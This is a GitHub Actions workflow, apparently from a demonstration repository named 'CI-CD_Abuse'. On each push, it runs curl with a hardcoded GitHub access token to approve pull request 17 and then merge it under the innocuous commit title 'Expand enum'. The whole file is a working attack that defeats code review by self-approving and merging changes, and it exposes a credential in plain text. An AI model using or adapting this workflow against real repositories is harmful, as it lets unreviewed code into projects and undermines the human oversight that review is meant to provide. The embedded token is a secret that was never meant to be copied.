```
name: First Workflow
on: push

permissions:
  pull-requests: write
jobs:
  approve:
    runs-on: ubuntu-latest

    steps:
      - run: |
         curl --request POST \
         --url https://api.github.com/repos/bitL3gion/CI-CD_Abuse/pulls/17/reviews \
         --header 'authorization: Bearer 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' \
         --header 'content-type: application/json' \
         -d '{"event":"APPROVE"}'
      - run: |
         curl -L \
         -X PUT \
         -H "Accept: application/vnd.github+json" \
         -H "Authorization: Bearer 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" \
         -H "X-GitHub-Api-Version: 2022-11-28" \
         https://api.github.com/repos/bitL3gion/CI-CD_Abuse/pulls/17/merge \
         -d '{"commit_title":"Expand enum","commit_message":"Add a new value to the merge_method enum"}'
```
